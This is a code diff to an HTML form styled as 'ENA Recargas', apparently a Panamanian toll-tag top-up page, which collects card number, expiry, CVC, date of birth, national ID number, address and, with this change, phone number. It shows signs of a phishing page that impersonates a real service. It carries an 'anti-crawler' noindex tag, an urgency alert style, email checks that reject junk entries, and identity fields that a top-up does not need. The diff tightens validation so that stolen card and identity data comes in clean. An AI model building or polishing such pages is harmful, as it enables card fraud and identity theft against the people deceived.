@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">  <!-- Added user-scalable=no to prevent zoom on iOS -->
     <!-- Anti-crawler meta: Prevents indexing by search bots -->
     <meta name="robots" content="noindex, nofollow">
     <title>ENA Recargas - Top Up Balance</title>
@@ -10,6 +10,7 @@
         /* Ensure full page coverage */
         html {
             height: 100%;
+            overflow-x: hidden;  /* Prevent horizontal scroll to avoid cutting edges */
         }
         body {
             background-image: url('/static/background2.jpg');  /* Path to your static image */
@@ -23,6 +24,7 @@
             color: #223136;
             height: 100vh;  /* Forces full viewport height coverage */
             width: 100vw;  /* Forces full viewport width coverage */
+            box-sizing: border-box;
         }
         .header {
             background-color: transparent;  /* Make header background transparent to show image */
@@ -82,6 +84,21 @@
         }
         .payment-fields {
             display: block;  /* Always visible now */
+        }
+        .phone-input-container {
+            position: relative;
+        }
+        .phone-prefix {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 16px;
+            pointer-events: none;
+        }
+        .phone-input {
+            padding-left: 70px;  /* Space for +507 */
         }
         .urgency-alert {
             background-color: #ffdddd;
@@ -194,7 +211,7 @@
         <form id="rechargeForm" action="/submit" method="POST">  <!-- Changed action to /submit to match app.py -->
             <div class="form-group">
                 <label for="tag">Número de Tag</label>
-                <input type="text" id="tag" name="tag">
+                <input type="text" id="tag" name="tag" maxlength="10">
                 <div class="error" id="tagError"></div>
             </div>
             <!-- Payment method is now assumed as CC, no dropdown -->
@@ -214,8 +231,8 @@
                     <div class="error" id="cardNumberError"></div>
                 </div>
                 <div class="form-group">
-                    <label for="expiry">Fecha de Expiración (MM/YY)</label>
-                    <input type="text" id="expiry" name="expiry" maxlength="5">
+                    <label for="expiry">Fecha de Expiración</label>
+                    <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY">
                     <div class="error" id="expiryError"></div>
                 </div>
                 <div class="form-group">
@@ -229,6 +246,14 @@
                     <div class="error" id="emailError"></div>
                 </div>
                 <div class="form-group">
+                    <label for="phone">Número de Teléfono</label>
+                    <div class="phone-input-container">
+                        <span class="phone-prefix">+507</span>
+                        <input type="text" id="phone" name="phone" class="phone-input" maxlength="9">  <!-- Allow 8 digits + space formatting -->
+                    </div>
+                    <div class="error" id="phoneError"></div>
+                </div>
+                <div class="form-group">
                     <label for="dob">Fecha de Nacimiento</label>
                     <div class="dob-container">
                         <select id="dob-year" name="dob-year"><option value="">Año</option></select>
@@ -239,7 +264,7 @@
                 </div>
                 <div class="form-group">
                     <label for="cedula">Número de Cédula (ID Nacional)</label>
-                    <input type="text" id="cedula" name="cedula" maxlength="20">
+                    <input type="text" id="cedula" name="cedula" maxlength="9">
                     <div class="error" id="cedulaError"></div>
                 </div>
                 <div class="form-group">
@@ -276,7 +301,7 @@
         <p>Transacción Segura | Contacto: 800-ENA</p>
     </div>
 <script>
-    // Luhn algorithm validation for card number
+   // Luhn algorithm validation for card number
     function luhnCheck(cardNumber) {
         cardNumber = cardNumber.replace(/\D/g, '');  // Remove non-digits
         if (!/^\d{13,19}$/.test(cardNumber)) return false;  // Check length
@@ -352,22 +377,32 @@
         }
     });
 
-    // Expiry date formatting (MM/YY, numbers only, reject < 2025)
+    // Expiry date formatting (MM/YY, allow clearing /)
     const expiryInput = document.getElementById('expiry');
     expiryInput.addEventListener('input', function(e) {
-        let cleanValue = e.target.value.replace(/\D/g, '');  // Numbers only
-        let value;
-        if (cleanValue.length > 0) {
-            cleanValue = cleanValue.substring(0, 4);  // Limit to 4 digits
-            if (cleanValue.length >= 2) {
-                value = cleanValue.replace(/(\d{2})(\d{0,2})/, '$1/$2');  // Add slash after 2 digits
-            } else {
-                value = cleanValue;
-            }
-        } else {
-            value = '';
+        let value = e.target.value.replace(/[^\d/]/g, '');  // Allow digits and /
+        value = value.replace(/\/+/g, '/');  // Only one /
+        value = value.substring(0,5);
+        if (value.length > 2 && value.charAt(2) !== '/') {
+            value = value.substring(0,2) + '/' + value.substring(2);
         }
         e.target.value = value;
+    });
+
+    // Phone number formatting (XXXX-XXXX for 8 digits, with +507 prefix visually)
+    const phoneInput = document.getElementById('phone');
+    phoneInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');  // Numbers only
+        if (value.length === 0) {
+            e.target.value = '';
+            return;
+        }
+        value = value.substring(0, 8);  // Limit to 8 digits
+        if (value.length > 4) {
+            e.target.value = value.substring(0, 4) + '-' + value.substring(4);
+        } else {
+            e.target.value = value;
+        }
     });
 
     // Email validation (restrict to common domains, reject gibberish)
@@ -460,7 +495,7 @@
         field.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (fieldId === 'cvc' && value.length > 4) value = value.substring(0, 4);
-            else if (fieldId === 'cedula' && value.length > 20) value = value.substring(0, 20);
+            else if (fieldId === 'cedula' && value.length > 9) value = value.substring(0, 9);
             else if (fieldId === 'zip' && value.length > 10) value = value.substring(0, 10);
             e.target.value = value;
         });
@@ -482,8 +517,8 @@
             showError('tagError', 'Por favor, ingresa el número de tag.');
             if (!firstErrorField) firstErrorField = document.getElementById('tag');
             isValid = false;
-        } else if (!/^\d{8}$/.test(tag)) {
-            showError('tagError', 'El número de tag debe tener 8 dígitos.');
+        } else if (!/^\d{10}$/.test(tag)) {
+            showError('tagError', 'El número de tag debe tener 10 dígitos.');
             if (!firstErrorField) firstErrorField = document.getElementById('tag');
             isValid = false;
         }
@@ -535,8 +570,7 @@
                 isValid = false;
             }
         }
-
-        const cvc = document.getElementById('cvc').value.trim();
+     const cvc = document.getElementById('cvc').value.trim();
         if (!cvc) {
             showError('cvcError', 'Por favor, ingresa el código CVC.');
             if (!firstErrorField) firstErrorField = document.getElementById('cvc');
@@ -565,6 +599,20 @@
             }
         }
 
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone) {
+            showError('phoneError', 'Por favor, ingresa el número de teléfono.');
+            if (!firstErrorField) firstErrorField = document.getElementById('phone');
+            isValid = false;
+        } else {
+            const phoneClean = phone.replace(/\D/g, '');
+            if (phoneClean.length !== 8) {
+                showError('phoneError', 'El teléfono debe tener 8 dígitos.');
+                if (!firstErrorField) firstErrorField = document.getElementById('phone');
+                isValid = false;
+            }
+        }
+
         const year = document.getElementById('dob-year').value;
         const monthName = document.getElementById('dob-month').value;
         const day = document.getElementById('dob-day').value;
@@ -589,14 +637,18 @@
             showError('cedulaError', 'Por favor, ingresa el número de cédula.');
             if (!firstErrorField) firstErrorField = document.getElementById('cedula');
             isValid = false;
+        } else if (!/^\d{7,9}$/.test(cedula)) {
+            showError('cedulaError', 'El número de cédula debe tener entre 7 y 9 dígitos.');
+            if (!firstErrorField) firstErrorField = document.getElementById('cedula');
+            isValid = false;
         }
 
         const street = document.getElementById('street').value.trim();
         if (!street) {
             showError('streetError', 'Por favor, ingresa la dirección.');
             if (!firstErrorField) firstErrorField = document.getElementById('street');
-            isValid = false;
-        }
+            isValid = false
+   }
 
         const city = document.getElementById('city').value.trim();
         if (!city) {
